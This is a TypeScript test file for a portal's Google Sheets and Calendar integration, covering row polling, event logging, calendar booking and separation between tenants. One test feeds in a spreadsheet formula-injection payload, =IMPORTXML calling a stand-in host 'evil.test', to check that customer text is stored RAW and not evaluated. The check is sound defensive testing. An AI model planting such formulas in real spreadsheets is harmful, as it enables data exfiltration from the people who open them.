// Google Sheets and Google Calendar, connected by sharing with the portal's
// service account.
//
// Every request is checked against what Google's API reference says it takes
// (paths, the RAW input option, the freeBusy body), so a drift fails here
// rather than in a business's sheet. Phone numbers and names are synthetic.
import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
import { generateKeyPairSync, createVerify } from "node:crypto";

const h = vi.hoisted(() => ({
  // wa_integrations rows, by tenant — tdb() below enforces the tenant filter.
  rows: [] as Record<string, unknown>[],
  inbound: [] as { row: Record<string, unknown>; secrets: Record<string, string> }[],
  ingested: [] as { tenantId: string; event: Record<string, unknown> }[],
  ingestOutcome: { outcome: "processed", detail: "1 message scheduled." } as { outcome: string; detail: string },
  activity: [] as unknown[],
}));

vi.mock("../tenantdb", () => ({
  tdb: (tenantId: string) => ({
    from: (_table: string) => {
      const filters: [string, unknown][] = [["tenant_id", tenantId]];
      let patch: Record<string, unknown> | null = null;
      let del = false;
      const match = () => h.rows.filter(r => filters.every(([k, v]) => r[k] === v));
      const q: Record<string, unknown> = {
        select: () => q, order: () => q,
        eq: (k: string, v: unknown) => { filters.push([k, v]); return q; },
        update: (p: Record<string, unknown>) => { patch = p; return q; },
        delete: () => { del = true; return q; },
        maybeSingle: async () => ({ data: match()[0] ?? null, error: null }),
        then: (res: (v: { data: unknown; error: null }) => unknown) => {
          if (patch) for (const r of match()) Object.assign(r, patch);
          if (del) h.rows = h.rows.filter(r => !match().includes(r));
          return Promise.resolve(res({ data: match(), error: null }));
        },
      };
      return q;
    },
  }),
}));
vi.mock("../inbound/store", async (orig) => ({
  ...(await orig<typeof import("../inbound/store")>()),
  liveConnectionsOfKind: async (kind: string) => h.inbound.filter(c => c.row.kind === kind),
  noteActivity: async (_i: unknown, p: unknown) => { h.activity.push(p); },
}));
vi.mock("../inbound/ingest", () => ({
  ingestEvents: async (i: { tenantId: string }, events: Record<string, unknown>[]) => {
    for (const event of events) h.ingested.push({ tenantId: i.tenantId, event });
    return events.map(e => ({ eventKey: e.eventKey, ...h.ingestOutcome }));
  },
}));

const { privateKey, publicKey } = generateKeyPairSync("rsa", {
  modulusLength: 2048,
  privateKeyEncoding: { type: "pkcs8", format: "pem" },
  publicKeyEncoding: { type: "spki", format: "pem" },
});
const ROBOT = "portal-bot@portal-prod.iam.gserviceaccount.com";
const KEY_JSON = JSON.stringify({ type: "service_account", client_email: ROBOT, private_key: privateKey });

const auth = await import("../google/auth");
const sheets = await import("../google/sheets");
const watch = await import("../google/sheetwatch");
const cal = await import("../google/calendar");
const integrations = await import("../integrations");
const { googleSheetsProvider } = await import("../inbound/connectors/google-sheets");
const { CATALOG_BY_ID, CONNECTABLE } = await import("../inbound/catalog");

type Rule = { match: RegExp; method?: string; status?: number | (() => number); json?: unknown | ((body: unknown) => unknown) };
let calls: { url: string; method: string; body: unknown; headers: Record<string, string> }[] = [];
function serve(rules: Rule[]) {
  vi.stubGlobal("fetch", async (url: string, init: RequestInit = {}) => {
    const method = init.method ?? "GET";
    let body: unknown = null;
    if (typeof init.body === "string") { try { body = JSON.parse(init.body); } catch { body = init.body; } }
    calls.push({ url, method, body, headers: (init.headers ?? {}) as Record<string, string> });
    if (/oauth2\.googleapis\.com\/token/.test(url)) return Response.json({ access_token: "tok-1", expires_in: 3600 });
    const r = rules.find(x => x.match.test(decodeURIComponent(url)) && (!x.method || x.method === method));
    if (!r) throw new TypeError(`fetch failed: ${method} ${url}`);
    const status = typeof r.status === "function" ? r.status() : r.status ?? 200;
    const json = typeof r.json === "function" ? (r.json as (b: unknown) => unknown)(body) : r.json;
    return new Response(json === undefined || status === 204 ? null : JSON.stringify(json), { status });
  });
}
const google = () => calls.filter(c => !/oauth2/.test(c.url));

const T1 = "11111111-1111-1111-1111-111111111111";
const T2 = "22222222-2222-2222-2222-222222222222";
const SHEET_ID = "1AbCdEfGhIjKlMnOpQrStUvWxYz0123456789";
const SHEET_URL = `https://docs.google.com/spreadsheets/d/${SHEET_ID}/edit#gid=0`;
const CAL = "team@example.com";

beforeEach(() => {
  calls = []; h.rows = []; h.inbound = []; h.ingested = []; h.activity = [];
  h.ingestOutcome = { outcome: "processed", detail: "1 message scheduled." };
  process.env.GOOGLE_SERVICE_ACCOUNT_JSON = KEY_JSON;
  auth.resetGoogleToken();
});
afterEach(() => { vi.unstubAllGlobals(); vi.useRealTimers(); delete process.env.GOOGLE_SERVICE_ACCOUNT_JSON; });

// ── The portal's Google account ───────────────────────────────────────────────

describe("the service account", () => {
  it("reads the key pasted as JSON or base64", () => {
    expect(auth.serviceAccount()?.email).toBe(ROBOT);
    process.env.GOOGLE_SERVICE_ACCOUNT_JSON = Buffer.from(KEY_JSON).toString("base64");
    expect(auth.serviceAccount()?.email).toBe(ROBOT);
  });

  it("is absent, not guessed, when the key is missing or not a service account", () => {
    delete process.env.GOOGLE_SERVICE_ACCOUNT_JSON;
    expect(auth.googleRobotEmail()).toBeNull();
    process.env.GOOGLE_SERVICE_ACCOUNT_JSON = JSON.stringify({ client_email: "someone@gmail.com", private_key: privateKey });
    expect(auth.serviceAccount()).toBeNull();
  });

  it("signs an RS256 assertion Google can verify, for exactly the two scopes", () => {
    const jwt = auth.signedAssertion(auth.serviceAccount()!, 1_800_000_000);
    const [hd, cl, sig] = jwt.split(".");
    expect(createVerify("RSA-SHA256").update(`${hd}.${cl}`).verify(publicKey, Buffer.from(sig, "base64url"))).toBe(true);
    const claims = JSON.parse(Buffer.from(cl, "base64url").toString());
    expect(claims).toMatchObject({ iss: ROBOT, aud: "https://oauth2.googleapis.com/token", exp: 1_800_003_600 });
    expect(claims.scope.split(" ").sort()).toEqual(["https://www.googleapis.com/auth/calendar", "https://www.googleapis.com/auth/spreadsheets"]);
  });

  it("never names Mindbird in this product's words", () => {
    delete process.env.GOOGLE_SERVICE_ACCOUNT_JSON;
    expect(auth.NOT_SET_UP).not.toMatch(/mindbird/i);
    expect(cal.calendarProblem(new (class extends Error {})("x"))).not.toMatch(/mindbird/i);
  });
});

// ── Sheets: rows in ───────────────────────────────────────────────────────────

describe("connecting a sheet to message its rows", () => {
  const meta = { properties: { title: "Fee reminders 2026" }, sheets: [{ properties: { title: "Send" } }, { properties: { title: "Old" } }] };

  it("is a polled tool: listed, connectable, and given no URL", () => {
    expect(CATALOG_BY_ID.get("google_sheets")).toMatchObject({ availability: "available", polled: true, showsWebhookUrl: false });
    expect(CONNECTABLE.has("google_sheets")).toBe(true);
    expect(CONNECTABLE.has("google_calendar")).toBe(false);   // nothing comes in from a calendar
    expect(googleSheetsProvider.verify({} as never)).toMatch(/doesn't post/);
  });

  it("says exactly what to share, with the portal's address, when Google refuses", async () => {
    serve([{ match: /spreadsheets\/1Ab/, status: 403, json: { error: { message: "denied" } } }]);
    const r = await googleSheetsProvider.connect!({ webhookUrl: "", config: { spreadsheetUrl: SHEET_URL, sendTab: "Send" }, secrets: { token: "x" } });
    expect(r.ok).toBe(false);
    expect(r.detail).toContain(`add ${ROBOT} as an Editor`);
  });

  it("names the tabs that exist when the one typed doesn't", async () => {
    serve([{ match: /fields=/, json: meta }]);
    const r = await googleSheetsProvider.connect!({ webhookUrl: "", config: { spreadsheetUrl: SHEET_URL, sendTab: "Sent" }, secrets: { token: "x" } });
    expect(r.detail).toBe("This sheet has no tab called “Sent”. Its tabs are: “Send”, “Old”.");
  });

  it("marks every row already there, adds the status column, and remembers it did", async () => {
    serve([
      { match: /fields=/, json: meta },
      { match: /values\/'Send'!A1:AZ/, json: { values: [["Name", "Phone", "Fee Amount"], ["Asha", "9876500001", "12000"], [], ["Ravi", "9876500002", "8000"]] } },
      { match: /values:batchUpdate/, method: "POST", json: {} },
    ]);
    const r = await googleSheetsProvider.connect!({ webhookUrl: "", config: { spreadsheetUrl: SHEET_URL, sendTab: "Send" }, secrets: { token: "x" } });
    expect(r.ok).toBe(true);
    expect(r.detail).toMatch(/The 2 rows already there were marked and won't be messaged/);
    expect(r.config).toMatchObject({ spreadsheetId: SHEET_ID, sendColumns: "name,phone,fee_amount", baselineFor: `${SHEET_ID}|Send` });
    const write = google().find(c => /values:batchUpdate/.test(c.url))!.body as { valueInputOption: string; data: { range: string; values: string[][] }[] };
    expect(write.valueInputOption).toBe("RAW");
    expect(write.data.map(d => d.range)).toEqual(["'Send'!D1", "'Send'!D2", "'Send'!D4"]);
    expect(write.data[0].values).toEqual([["Portal status"]]);
  });

  it("does not mark rows again when the same tab is saved again", async () => {
    serve([
      { match: /fields=/, json: meta },
      { match: /values\/'Send'!A1:AZ/, json: { values: [["Name", "Phone", "Portal status"], ["Asha", "9876500001", ""]] } },
    ]);
    const r = await googleSheetsProvider.connect!({ webhookUrl: "", config: { spreadsheetUrl: SHEET_URL, sendTab: "Send", baselineFor: `${SHEET_ID}|Send` }, secrets: { token: "x" } });
    expect(r.ok).toBe(true);
    expect(google().some(c => /values:batchUpdate/.test(c.url))).toBe(false);
  });
});

const inboundConn = (tenantId: string, config: Record<string, string> = {}) => ({
  row: { id: `c-${tenantId}`, tenantId, kind: "google_sheets", status: "connected", config: { spreadsheetId: SHEET_ID, sheetTitle: "Fees", sendTab: "Send", ...config } },
  secrets: { token: "x" },
});

describe("watching a tab", () => {
  const rows = [
    ["Name", "Phone", "Fee Amount", "Portal status"],
    ["Asha", "98765 00001", "12,000", "Done 2 Nov 2026, 10:00 am: 1 message scheduled."],
    ["Ravi", "98765 00002", "8,000"],
    ["Meena", "not a number", "5,000", ""],
    [],
  ];

  it("sends only rows without a status, and writes each outcome back in one call", async () => {
    h.inbound = [inboundConn(T1)];
    serve([{ match: /values\/'Send'!A1:AZ/, json: { values: rows } }, { match: /values:batchUpdate/, method: "POST", json: {} }]);
    const r = await watch.drainSheetRows();
    expect(google()).toHaveLength(2);   // one read, one write: the quota is shared by every business
    expect(r).toMatchObject({ tabs: 1, rows: 2 });
    expect(h.ingested.map(x => x.event.phone)).toEqual(["919876500002", ""]);
    const ravi = h.ingested[0].event as { eventKey: string; data: Record<string, unknown>; attributes: Record<string, string>; externalId: string };
    expect(ravi.eventKey).toBe("google_sheets.row_added");
    expect(ravi.data).toMatchObject({ name: "Ravi", fee_amount: "8,000", row: 3 });
    expect(ravi.attributes).toEqual({ sheet_name: "Ravi", sheet_fee_amount: "8,000" });
    const write = google()[1].body as { data: { range: string; values: string[][] }[] };
    expect(write.data.map(d => d.range)).toEqual(["'Send'!D3", "'Send'!D4"]);
    expect(write.data[0].values[0][0]).toMatch(/^Done .*1 message scheduled\.$/);
  });

  it("each business's rows are acted on for that business only", async () => {
    h.inbound = [inboundConn(T1), inboundConn(T2, { spreadsheetId: "2ZzZzZzZzZzZzZzZzZzZzZzZzZz" })];
    serve([
      { match: /1AbCd.*values\/'Send'!A1:AZ/, json: { values: [rows[0], ["Ravi", "98765 00002"]] } },
      { match: /2ZzZz.*values\/'Send'!A1:AZ/, json: { values: [rows[0], ["Kiran", "98765 00003"]] } },
      { match: /values:batchUpdate/, method: "POST", json: {} },
    ]);
    await watch.drainSheetRows();
    expect(h.ingested.map(x => [x.tenantId, x.event.name])).toEqual([[T1, "Ravi"], [T2, "Kiran"]]);
  });

  it("marks a row that was already sent, rather than leaving it looking queued", async () => {
    h.inbound = [inboundConn(T1)];
    h.ingestOutcome = { outcome: "duplicate", detail: "Already received" };
    serve([{ match: /values\/'Send'!A1:AZ/, json: { values: [rows[0], rows[2]] } }, { match: /values:batchUpdate/, method: "POST", json: {} }]);
    await watch.drainSheetRows();
    expect((google()[1].body as { data: { values: string[][] }[] }).data[0].values[0][0]).toMatch(/^Already handled/);
  });

  it("shows a lost share on the connection instead of failing the whole run", async () => {
    h.inbound = [inboundConn(T1)];
    serve([{ match: /values\//, status: 403, json: { error: { message: "denied" } } }]);
    expect((await watch.drainSheetRows()).failed).toBe(1);
    expect(JSON.stringify(h.activity)).toContain(`add ${ROBOT} as an Editor`);
  });

  it("the row id changes with the row's content, not with its status", () => {
    const a = watch.rowExternalId(SHEET_ID, "Send", 3, ["Ravi", "98765", ""], 2);
    expect(watch.rowExternalId(SHEET_ID, "Send", 3, ["Ravi", "98765", "Failed …"], 2)).toBe(a);
    expect(watch.rowExternalId(SHEET_ID, "Send", 3, ["Ravi", "98766", ""], 2)).not.toBe(a);
  });
});

// ── Sheets: events out ────────────────────────────────────────────────────────

const sheetRow = (tenantId: string, extra: Record<string, unknown> = {}) => ({
  id: `i-${tenantId}`, tenant_id: tenantId, kind: "google_sheets", name: "Leads sheet", active: true,
  config: { spreadsheetUrl: SHEET_URL, spreadsheetId: SHEET_ID }, events: ["contact.created", "conversation.escalated"],
  status: "connected", secret: null, created_at: "2026-11-01T00:00:00Z", ...extra,
});

describe("logging events to a sheet", () => {
  it("appends one row, RAW, so a customer's text is never run as a formula", async () => {
    h.rows = [sheetRow(T1)];
    serve([{ match: /values\/'Portal log'!A1:append/, method: "POST", json: {} }]);
    await integrations.emitEvent(T1, "conversation.escalated", { phone: "919876500001", name: "Asha Verma", reason: "=IMPORTXML(\"http://evil.test\")" });
    const c = google()[0];
    expect(c.url).toContain("valueInputOption=RAW");
    expect((c.body as { values: string[][] }).values[0].slice(1)).toEqual(["Chat handed to a human", "Asha Verma", "+919876500001", "", "=IMPORTXML(\"http://evil.test\")"]);
  });

  it("reaches only the business whose event it is", async () => {
    h.rows = [sheetRow(T2)];
    serve([]);
    await integrations.emitEvent(T1, "contact.created", { phone: "919876500001", name: "Asha" });
    expect(google()).toHaveLength(0);
  });

  it("checks the sheet on connect and keeps its id and title", async () => {
    h.rows = [sheetRow(T1, { config: { spreadsheetUrl: SHEET_URL }, status: "unverified" })];
    serve([
      { match: /fields=/, json: { properties: { title: "Leads" }, sheets: [] } },
      { match: /:batchUpdate$/, method: "POST", json: {} },
      { match: /values\/'Portal log'!A1:AZ/, json: {} },
      { match: /values:batchUpdate/, method: "POST", json: {} },
    ]);
    const r = await integrations.verifyIntegration(`i-${T1}`, T1);
    expect(r).toEqual({ ok: true, detail: "Connected to “Leads”. Events go to the “Portal log” tab." });
    expect(h.rows[0].config).toMatchObject({ spreadsheetId: SHEET_ID, sheetTitle: "Leads" });
    expect(JSON.stringify(google().find(c => /values:batchUpdate/.test(c.url))!.body)).toContain("\"When\",\"Event\",\"Name\",\"Phone\",\"Email\",\"Details\"");
  });
});

// ── Calendar: booking from a flow ─────────────────────────────────────────────

const calRow = (tenantId: string) => ({
  id: `g-${tenantId}`, tenant_id: tenantId, kind: "google_calendar", name: "Team calendar", active: true,
  config: { calendarId: CAL }, events: [], status: "connected", secret: null, created_at: "2026-11-01T00:00:00Z",
});

describe("retrying a failed sheet log", () => {
  it("retries a rate limit or an outage, never a timeout that may already have landed", async () => {
    const { GoogleApiError } = await import("../google/api");
    expect(integrations.isRetriableDelivery("google_sheets", new GoogleApiError("Google answered HTTP 429", 429))).toBe(true);
    expect(integrations.isRetriableDelivery("google_sheets", new GoogleApiError("Google answered HTTP 503", 503))).toBe(true);
    expect(integrations.isRetriableDelivery("google_sheets", new GoogleApiError("Google did not answer in time.", 408))).toBe(false);
    expect(integrations.isRetriableDelivery("google_sheets", new GoogleApiError("Google answered HTTP 403", 403))).toBe(false);
  });
});

describe("booking into Google Calendar", () => {
  let busy: { start: string; end: string }[] = [];
  let inserted: Record<string, unknown>[] = [];
  beforeEach(() => {
    vi.useFakeTimers({ toFake: ["Date"] });
    vi.setSystemTime(new Date("2026-11-03T03:30:00Z"));   // Tue 09:00 India time
    busy = []; inserted = [];
    serve([
      { match: /freeBusy$/, method: "POST", json: () => ({ calendars: { [CAL]: { busy } } }) },
      { match: /\/events\?sendUpdates=none$/, method: "POST", json: (b: unknown) => { inserted.push(b as Record<string, unknown>); return { id: `ev${inserted.length}` }; } },
    ]);
  });

  it("offers up to eight free times inside working hours, after the notice", async () => {
    h.rows = [calRow(T1)];
    const r = await integrations.scheduleSlots(T1, { tz: "Asia/Kolkata" });
    expect(r?.provider).toBe("google_calendar");
    expect(r?.slots).toHaveLength(8);
    expect(r?.slots[0]).toMatchObject({ id: "s0", iso: "2026-11-03T05:30:00.000Z" });   // 11:00 IST: 2h notice from 09:00
  });

  it("books the time with the customer's name and number, inviting nobody", async () => {
    h.rows = [calRow(T1)];
    expect(await integrations.scheduleBook(T1, { startIso: "2026-11-04T05:30:00.000Z", name: "Asha Verma", phone: "919876500001", channel: "WhatsApp" })).toBe(true);
    const ev = inserted[0] as { summary: string; description: string; attendees?: unknown };
    expect(ev.summary).toBe("Call with Asha Verma");
    expect(ev.description).toContain("WhatsApp: +919876500001");
    expect(ev.description).not.toMatch(/mindbird/i);
    expect(ev.attendees).toBeUndefined();
  });

  it("never double-books: a time taken meanwhile is refused", async () => {
    h.rows = [calRow(T1)];
    busy = [{ start: "2026-11-04T05:30:00Z", end: "2026-11-04T06:00:00Z" }];
    expect(await integrations.scheduleBook(T1, { startIso: "2026-11-04T05:30:00.000Z", name: "Asha" })).toBe(false);
    expect(inserted).toHaveLength(0);
  });

  it("books into the calendar of the business the chat belongs to, never another's", async () => {
    h.rows = [calRow(T2)];
    expect(await integrations.scheduleSlots(T1, {})).toBeNull();
    expect(await integrations.scheduleBook(T1, { startIso: "2026-11-04T05:30:00.000Z", name: "Asha" })).toBe(false);
    expect(google()).toHaveLength(0);
  });

  it("leaves Cal.com exactly as it was: still needs an email", async () => {
    h.rows = [{ ...calRow(T1), kind: "calcom", config: { eventTypeId: "123" } }];
    expect(await integrations.scheduleProvider(T1)).toBe("calcom");
    expect(await integrations.scheduleBook(T1, { startIso: "2026-11-04T05:30:00.000Z", name: "Asha" })).toBe(false);   // no email, no Cal.com call
    expect(google()).toHaveLength(0);
  });
});

describe("free times (India time, though the server runs on UTC)", () => {
  const s = cal.bookingSettings({ calendarId: CAL }).settings!;
  const now = new Date("2026-11-03T03:30:00Z");
  it("starts after the notice, ends with the working day, skips days off", () => {
    const slots = cal.freeSlots(s, [], now);
    expect(cal.slotLabels(slots[0]).full).toBe("Tue 3 Nov, 11:00 am");
    const tuesday = slots.filter(x => cal.slotLabels(x).dayKey === "2026-11-03");
    expect(cal.slotLabels(tuesday[tuesday.length - 1]).time).toBe("6:30 pm");
    expect(new Set(slots.map(x => cal.slotLabels(x).day.slice(0, 3))).has("Sun")).toBe(false);
  });
  it("leaves out busy times, but not the moment a meeting ends", () => {
    const busy = [{ start: new Date("2026-11-03T05:30:00Z"), end: new Date("2026-11-03T06:30:00Z") }];
    expect(cal.freeSlots(s, busy, now).map(x => cal.slotLabels(x).time).slice(0, 2)).toEqual(["12:00 pm", "12:30 pm"]);
  });
});

describe("connecting a calendar", () => {
  it("catches a calendar shared read-only before any customer meets it", async () => {
    h.rows = [{ ...calRow(T1), status: "unverified" }];
    serve([
      { match: /calendars\/team@example\.com$/, json: { summary: "Team", timeZone: "Asia/Kolkata" } },
      { match: /\/events\?sendUpdates=none$/, method: "POST", status: 403, json: { error: { message: "Forbidden" } } },
    ]);
    const r = await integrations.verifyIntegration(`g-${T1}`, T1);
    expect(r.ok).toBe(false);
    expect(r.detail).toBe(`The portal can see “Team” but can't add bookings to it. In its sharing settings, change ${ROBOT} to "Make changes to events".`);
  });
});
